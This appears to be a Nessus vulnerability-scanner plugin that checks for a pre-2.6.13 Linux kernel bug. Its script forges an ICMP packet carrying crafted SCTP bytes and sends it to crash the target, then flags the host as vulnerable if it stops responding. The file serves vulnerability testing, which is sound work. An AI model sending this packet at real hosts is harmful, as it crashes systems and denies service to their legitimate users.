#
# This script was written by Michel Arboi <mikhail@nessus.org>
# Credits: Charles-Henri de Boysson 
#
# Fixed in 2.6.13 vanilla kernel

if(description)
{
 script_id(19777);
 script_version ("$Revision: 1.5 $");
 script_name(english: "Malformed ICMP Packets May Cause a Denial of Service (SCTP)");
 
 desc = "
Synopsis :

It is possible to crash the remote host by sending it malformed ICMP packets.

Description :

Linux Kernels older than version 2.6.13 contains a bug which may allow an
attacker to cause a NULL pointer dereference by sending malformed ICMP packets,
thus resulting in a kernel panic.

This flaw is present only if SCTP support is enabled on the remote host.

An attacker to make this host crash continuously, thus preventing legitimate 
users from using it.

See also :

http://oss.sgi.com/projects/netdev/archive/2005-07/msg00142.html

Solution : 

Ugprade to Linux 2.6.13 or newer, or disable SCTP support.

Risk factor :

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:N/A:C/I:N/B:A)";
 script_description(english:desc);

 script_summary(english: "Kills the remote Linux with a bad ICMP packet");
 
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2005 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
		       
 exit(0);
}

include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);
start_denial();

src = this_host();
dst = get_host_ip();
id = rand();

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0xC0, ip_off: 0,
                        ip_p:IPPROTO_ICMP, ip_id: id, ip_ttl:0x40,
	     	        ip_src:this_host());
ip2 = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
                        ip_p: 132, ip_id: id+1, ip_ttl:0x40,
	     	        ip_src:this_host(), 
			data: '\x28\x00\x00\x50\x00\x00\x00\x00\xf9\x57\x1F\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00');
icmp = forge_icmp_packet(ip:ip, icmp_type: 3, icmp_code:2,
	     		  icmp_seq: 0, icmp_id:0, data: ip2);
send_packet(icmp, pcap_active: 0);

alive = end_denial();
if(!alive)
{
 security_hole();
 set_kb_item(name:"Host/dead", value:TRUE);
}

